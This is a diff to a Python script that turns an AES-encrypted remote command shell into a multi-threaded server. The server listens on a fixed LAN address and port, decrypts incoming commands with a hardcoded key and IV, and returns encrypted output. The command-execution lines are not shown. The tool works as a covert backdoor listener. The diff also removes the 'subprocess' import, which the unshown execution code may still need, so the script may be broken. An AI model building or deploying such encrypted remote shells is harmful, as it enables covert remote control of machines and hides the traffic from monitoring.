@@ -1,7 +1,7 @@
 import os
-import subprocess
 import socket
 from Crypto.Cipher import AES
+from _thread import *
 
 def encrypt(encrypt_data):
     obj = AES.new(b"1122334456789001", AES.MODE_CFB, b"2299225510784791")
@@ -14,15 +14,17 @@ def decrypt(decrypt_data):
     return data
 host = "192.168.68.111"
 port = 8080
+ThreadCount = 0
 ssocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ssocket.bind((host, port))
+print('Waiting for a Connection..')
 ssocket.listen(5)
-while True:
-    try:
-        consocket, addr = ssocket.accept()
-        cmds = consocket.recv(2048)
+
+def threaded_client(connection):
+    while True:
+        cmds = connection.recv(2048)
         temp = decrypt(cmds)
-        cmd = temp.decode() 
+        cmd = temp.decode()
         while(cmd != "exit" and cmd != ""):
             print(addr, "  ", cmd)
             if cmd.startswith("cd"):
@@ -60,14 +62,17 @@ while True:
                 #    if output == "":
                 #            output = "Done"
             outputs = encrypt(output)
-            consocket.send(outputs)
-            cmds = consocket.recv(2048)
+            connection.send(outputs)
+            cmds = connection.recv(2048)
             temp = decrypt(cmds)
             cmd = temp.decode()
             if cmd == "exit":
                 print("broken")
-                consocket.close()
+                connection.close()
                 break
-        consocket.close()
-    except Exception:
-        pass
+while True:
+    consocket, addr = ssocket.accept()
+    start_new_thread(threaded_client, (consocket, ))
+    ThreadCount += 1
+    print('Thread Number: ' + str(ThreadCount))
+ssocket.close()
